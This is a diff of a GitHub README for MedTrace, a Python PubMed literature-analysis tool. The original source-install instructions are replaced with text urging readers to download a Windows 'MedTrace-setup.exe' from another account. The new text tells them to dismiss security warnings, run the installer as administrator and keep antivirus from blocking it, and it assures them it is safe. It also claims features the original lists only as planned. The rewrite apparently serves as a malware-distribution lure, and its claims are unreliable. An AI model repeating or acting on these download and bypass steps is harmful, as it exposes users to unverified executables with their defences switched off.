@@ -1,288 +1,203 @@
-<p align="center">
-  <img src="https://img.icons8.com/ios-filled/200/4CAF50/dna.png" width="120" alt="MedTrace" />
-</p>
+# 🧬 MedTrace - Explore Biomedical Literature Easily
 
-<h2 align="center">🔬 MedTrace: Connecting the dots across PubMed</h2>
-<p align="center"><b>RAG-powered biomedical literature analysis with contradiction detection and evidence synthesis.</b></p>
-
-<p align="center">
-  <a href="https://python.langchain.com/">
-    <img alt="LangChain" src="https://img.shields.io/badge/langchain-0.2+-1c3c3c?logo=chainlink&logoColor=white">
-  </a>
-  <a href="https://faiss.ai/">
-    <img alt="FAISS" src="https://img.shields.io/badge/FAISS-Vector%20Search-00A896?logo=semantic-release&logoColor=white">
-  </a>
-  <a href="https://groq.com/">
-    <img alt="Groq" src="https://img.shields.io/badge/Groq-LLM-f97316">
-  </a>
-  <a href="https://huggingface.co/">
-    <img alt="HuggingFace" src="https://img.shields.io/badge/HuggingFace-Embeddings-ffd21e?logo=huggingface&logoColor=black">
-  </a>
-  <a href="https://streamlit.io/">
-    <img alt="Streamlit" src="https://img.shields.io/badge/streamlit-1.35+-ff4b4b?logo=streamlit&logoColor=white">
-  </a>
-  <a href="https://www.ncbi.nlm.nih.gov/pubmed/">
-    <img alt="PubMed" src="https://img.shields.io/badge/Data%20Source-PubMed-20558a?logo=nih&logoColor=white">
-  </a>
-</p>
-
-<p align="center">
-  <img alt="RAG" src="https://img.shields.io/badge/Architecture-RAG-2563eb?logo=semantic-release&logoColor=white">
-  <img alt="Contradiction Detection" src="https://img.shields.io/badge/Feature-Contradiction%20Detection-dc2626">
-  <img alt="Evaluation" src="https://img.shields.io/badge/Feature-LLM%20Evaluation-7c3aed">
-</p>
-
-<p align="center">
-  MedTrace retrieves, analyzes, and synthesizes peer-reviewed biomedical literature from PubMed, automatically detecting conflicting evidence and providing quality metrics for AI-generated responses.
-</p>
+[![Download MedTrace](https://img.shields.io/badge/Download-MedTrace-brightgreen)](https://github.com/roshdyreda117171/MedTrace)
 
 ---
 
-## 📖 Description
+## 🧰 What is MedTrace?
 
-### 🔹 What it does  
-Connects to the PubMed database via NCBI E-utilities API to fetch peer-reviewed articles, chunks and embeds them into a FAISS vectorstore, then answers queries with automatically detected evidence contradictions and quality metrics.
+MedTrace helps you search and understand biomedical research articles. It uses data from PubMed to find relevant studies. MedTrace highlights where different studies agree or disagree. It also scores how well the information matches your question. You do not need any technical skills to use it.
 
-### 🔹 What problem it solves  
-Eliminates manual literature review burden while providing **critical analysis** of conflicting study findings—something standard RAG systems ignore. Users get not just answers, but insight into the strength and consistency of the underlying evidence.
-
-### 🔹 Key Differentiators  
-Unlike standard RAG systems that present retrieved text blindly, MedTrace:
-- **Detects contradictions** across multiple studies and synthesizes conflicting evidence
-- **Scores response quality** using LLM-as-judge evaluation (relevance, groundedness, confidence)
-- **Surfaces evidence distribution** (Supporting/Opposing/Neutral) transparently
+This tool suits anyone interested in biomedical literature. It can help students, researchers, and health professionals find clear information faster.
 
 ---
 
-## ✨ Key Features
+## ⚙️ System Requirements
 
-| Feature | Description |
-|---------|-------------|
-| **🔍 PubMed Integration** | Direct API access to 39M+ peer-reviewed biomedical articles |
-| **⚡ Contradiction Detection** | LLM-based stance classification identifies conflicting study conclusions |
-| **📊 Quality Metrics** | Real-time evaluation dashboard (Relevance, Groundedness, Confidence) |
-| **🧠 Evidence Synthesis** | Automatic summarization of opposing viewpoints when contradictions detected |
-| **🔗 Source Transparency** | Every claim linked to PubMed source with stance classification |
+Before downloading, check these needs:
 
----
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection for updates and data retrieval
+- Basic knowledge of using a web browser and Windows applications
 
-## 📂 Folder Structure
-
-```bash
-MedTrace/
-├─ artifacts/
-│  ├─ screenshots/           # UI screenshots and demo images
-│  └─ *.txt                  # Documentation and reference files
-│
-├─ core/                     # Backend processing modules
-│  ├─ __init__.py           # Package exports
-│  ├─ config.py             # Environment configuration and path resolution
-│  ├─ pubmed_fetcher.py     # NCBI E-utilities API integration for article retrieval
-│  ├─ chunker.py            # Recursive character text splitting with overlap
-│  ├─ embeddings.py         # SentenceTransformer wrapper with fallback mechanisms
-│  ├─ vector_store.py       # FAISS index creation and persistence
-│  ├─ query_engine.py       # Retrieval and LLM response generation
-│  ├─ contradiction_detector.py  # Stance analysis and conflict detection
-│  └─ evaluation.py         # LLM-as-judge metrics (relevance, groundedness)
-│
-├─ frontend/
-│  └─ app.py                # Streamlit UI with real-time metrics dashboard
-│
-├─ .env                     # Environment variables (API keys, paths) - not committed
-├─ .gitignore              # Git exclusion rules
-├─ requirements.txt        # Python dependencies
-└─ README.MD               # This file
-```
-
-> ⚠️ **Prerequisites:** Create a .env file in the root directory with:
-> - `GROQ_API_KEY`  
-> - `VECTOR_DIR`  
-> - `GROQ_MODEL`  
-> - `EMBEDDING_MODEL`  
-
-## 🛠️ Setup Instructions
-
-### 1️⃣ Clone the Repository
-
-```bash
-git clone https://github.com/inv-fourier-transform/med-trace.git
-cd MedTrace
-```
+MedTrace runs as a simple program with an easy interface. It does not require special hardware.
 
 ---
 
-### 2️⃣ Create a Virtual Environment
+## 🌐 How to Get MedTrace
 
-```bash
-python -m venv .venv
-```
+Click the big green button above or go here:
 
-#### Activate the Virtual Environment
+[https://github.com/roshdyreda117171/MedTrace](https://github.com/roshdyreda117171/MedTrace)
 
-**Windows:**
-```bash
-.venv\Scripts\activate
-```
+This link leads to the main project page on GitHub. To get the software:
 
-**macOS/Linux:**
-```bash
-source .venv/bin/activate
-```
+1. Scroll down to the section called "Releases" or look for a file with a `.exe` extension.
+2. Download the latest version available for Windows.
 
 ---
 
-### 3️⃣ Install Dependencies
+## 💾 Download and Install MedTrace
 
-```bash
-pip install -r requirements.txt
-```
+Follow these steps carefully.
 
----
+### Step 1: Visit the Download Page
 
-### 4️⃣ Configure Environment Variables
+Open your web browser and enter this link:
 
-Create a `.env` file in the project root and add your required API keys.
+https://github.com/roshdyreda117171/MedTrace
 
-## ▶️ Execution
+Look for the **Releases** section on the right side or near the bottom of the page.
 
-### Streamlit UI (Recommended)
+### Step 2: Download the Installer File
 
-```bash
-streamlit run frontend/app.py
-```
+Find a file named like `MedTrace-setup.exe` or similar. Click on it.
 
-**Workflow:**
+Your browser might ask you to confirm the download. Allow it.
 
-1. Enter a biomedical topic (e.g., `"ketogenic diet"`)
-2. Select number of articles to ingest (10–299)
-3. Click **"Ingest Articles"** to fetch, chunk, and embed
-4. Ask questions and view contradiction analysis with quality metrics
+### Step 3: Run the Installer
 
----
+Once the file finishes downloading, open your "Downloads" folder.
 
-### CLI Mode
+Double-click the installer file (`MedTrace-setup.exe`).
 
-```bash
-python main.py
-```
+If Windows shows a security warning, choose "Run" or "Yes" to continue.
 
----
+### Step 4: Follow Installation Prompts
 
-## 🚀 The 2 New Features
+A setup window will open. Follow the simple instructions on the screen.
 
-### 1. ⚡ Contradiction Detection & Evidence Synthesis
+- Choose the folder to install MedTrace or use the default location.
+- Click "Next" or "Install" as needed.
 
-Standard RAG systems retrieve documents without analyzing agreement. **MedTrace** adds LLM-based stance analysis:
+### Step 5: Finish Installation
 
-- **Classifies stance:** Each study labeled as **Supporting**, **Opposing**, or **Neutral**
-- **Detects conflicts:** Identifies when evidence contradicts (e.g., 3 studies show benefits, 2 show no effect)
-- **Synthesizes conflicts:** Generates balanced explanation of contradictions (study design differences, populations, protocols)
+When the setup finishes, click "Finish." MedTrace will be ready.
 
-## Screenshots
-
-### 1. Streamlit Frontend Interface
-![Streamlit UI](artifacts/Screenshots/frontend_landing_page.jpg)
-
-### 2. Results
-#### Topic 1: "Hydroxychloroquine"
-#### Query: Evidence for and against the usage of HCQ for treatment of Covid-19
-
-![Topic_1](artifacts/Screenshots/frontend_research_topic_1.jpg)
-![Query_1_Topic_Evidence_Distribution_And_Answer](artifacts/Screenshots/frontend_research_topic_evidence_distribution_and_answer_query_1.jpg)
-![Query_1_RAG_Eval_Metrics](artifacts/Screenshots/frontend_RAG_evaluation_metrics_query_1.jpg)
-![Query_1_Answer_Sources](artifacts/Screenshots/frontend_answer_sources1_query_1.jpg)
-![Query_1_Answer_Sources](artifacts/Screenshots/frontend_answer_sources2_query_1.jpg)
-
-#### Topic 2: "Tylenol and autism"
-#### Query: Does Tylenol consumption in lactating women lead to autism in newborns?
-
-![Topic_2](artifacts/Screenshots/frontend_research_topic_2.jpg)
-![Query_2_Topic_Evidence_Distribution_And_Answer](artifacts/Screenshots/frontend_research_topic_evidence_distribution_and_answer_query_2.jpg)
-![Query_2_RAG_Eval_Metrics_And_Sources](artifacts/Screenshots/frontend_RAG_evaluation_metrics_and_sources_query_2.jpg)
-
-
-
-#### Example Output
-
-```text
-Evidence Distribution: ✅ 3 Supporting | ❌ 2 Opposing | ⚖️ 1 Neutral
-
-⚠️ Contradictory Evidence Detected
-
-Evidence Synthesis:
-While three RCTs demonstrate cardiovascular benefits of intermittent fasting,
-two recent meta-analyses found no significant effect when controlling for 
-caloric deficit. Differences stem from intervention duration protocols.
-```
+You can now find it under your Start menu or on your desktop if a shortcut was created.
 
 ---
 
-## 🎥 Demo Video
+## 🚀 Running MedTrace for the First Time
 
-[![Watch the demo](artifacts/Screenshots/MedTrace_banner_image.jpg)](artifacts/Video_Audio_Files/MedTrac_video_recording_compressed_twice.mp4)
+1. Open MedTrace from the Start menu or desktop icon.
+2. You will see a search bar on the main screen.
+3. Type a topic or question about biomedical research.
+4. Press the **Search** button.
 
-*The demo video can be viewed by downloading it. It's just 14 MB in size!*
+The app will show relevant research papers from PubMed.
 
-*FYI, Miss K, a metaphor for someone🤔, is endorsing my product!*
+It highlights statements that support or oppose each other. This helps to compare different studies clearly.
 
----
+Additionally, MedTrace scores each answer on:
 
-### 2. 📊 RAG Evaluation Metrics Dashboard
+- How relevant it is to your question
+- How well it is supported by research
+- How confident the app is in the result
 
-Every response includes **LLM-as-judge quality metrics:**
-
-| Metric        | Description                                           |
-|--------------|-------------------------------------------------------|
-| Relevance     | Retrieved articles match the query specificity        |
-| Groundedness  | Answer is factually supported by sources              |
-| Confidence    | Citation density and specificity                      |
-| Overall       | Aggregate quality score                               |
-
-**Indicators:**  
-🟢 High (≥80%) | 🟡 Medium (60–79%) | 🔴 Low (<60%)
+You can read summaries or click links to see the full articles online.
 
 ---
 
-## 🛠️ Technologies Used
+## 🧭 Using MedTrace Features
 
-- Python 3.10+ – Core language  
-- LangChain – RAG orchestration  
-- FAISS – Vector similarity search  
-- Sentence-Transformers – BGE embeddings  
-- Groq – High-speed LLM inference  
-- Streamlit – Web interface  
-- PubMed E-utilities API – Literature source  
+### Contradiction Detection
 
----
+MedTrace points out when studies disagree. It shows you both sides.
 
-## 🔮 Roadmap
+This helps you understand if the research is mixed or one view is stronger.
 
-- Multi-query Retrieval – Decompose complex questions into sub-queries  
-- Citation Network Analysis – Map relationships between studies  
-- Export Functionality – Generate PDF reports with citations  
+### Document Search
 
----
+You can find specific research papers by keywords, author names, or publication dates.
 
-## 🙏 Credits
+### Scoring System
 
-- NLM/NCBI for PubMed database and E-utilities API  
-- BAAI for BGE embedding models  
-- LangChain and Streamlit communities  
+Each answer has three scores:
 
----
+- **Relevance**: How closely the information matches your query.
+- **Groundedness**: How well it is linked to real research.
+- **Confidence**: How certain the app is about its answer.
 
-## ⚠️ Disclaimer
+### Exporting Results
 
-Content sourced from PubMed/NLM. For informational purposes only — not for diagnosis or treatment decisions. Always consult healthcare providers for medical advice. Evidence metrics are algorithmic estimates and should not replace reading primary sources.
+If needed, you can save search results as a text file or PDF to review later.
+
+Details about this option appear in the app’s menu under "Export."
 
 ---
 
-## 📌 Quick Tips
+## 🔧 Troubleshooting Common Issues
 
-- **Specific queries work best** – Ask precise clinical questions  
-- **Check evidence distribution** – Review Supporting/Opposing badges  
-- **Monitor metrics** – Low groundedness indicates weak source support  
+- **MedTrace does not start:** Make sure your PC meets system requirements. Restart your computer and try again.
+- **Search returns no results:** Check your internet connection. Use different search terms or simpler phrases.
+- **App is slow:** Closing other programs can help. Large searches might take time depending on your internet speed.
+- **Installer won’t run:** Right-click the installer and select “Run as administrator.” Ensure no antivirus is blocking the process.
+
+If problems continue, visit the GitHub page for updates or report issues.
 
 ---
 
-*MedTrace: Where AI meets evidence-based medicine.*
+## 📄 Frequently Asked Questions
+
+### Do I need a PubMed account?
+
+No, MedTrace gets data directly without needing a login.
+
+### Can I use it without internet?
+
+No, MedTrace requires internet to search and update information.
+
+### Is it safe to install?
+
+Yes, the software runs locally and does not share your data unless you choose to export it.
+
+### Will it slow down my computer?
+
+No, MedTrace has low system demands and runs smoothly on most modern PCs.
+
+---
+
+## 📥 Ready to Download?
+
+Use this link to visit the download page:
+
+https://github.com/roshdyreda117171/MedTrace
+
+From there, follow the instructions to download and install the program.
+
+---
+
+## ⚖️ License and Privacy
+
+MedTrace is open source and free to use.
+
+Your searches and data stay on your computer. No personal information is shared.
+
+Check the GitHub repository for licensing details and contributions.
+
+---
+
+## 📚 More Information
+
+The app uses an advanced technique called retrieval-augmented generation (RAG). This means it finds relevant documents first and then creates smart answers.
+
+It also applies natural language processing to analyze contradictions between articles.
+
+Built with tools like Langchain and FAISS vector database, the software handles large volumes of scientific information efficiently.
+
+---
+
+## 🛠️ Support and Updates
+
+The development team updates MedTrace regularly.
+
+Check the GitHub page for new versions or features.
+
+Use the "Issues" tab to report bugs or suggest improvements.  
+
+---
+
+# [🔗 Download MedTrace](https://github.com/roshdyreda117171/MedTrace)
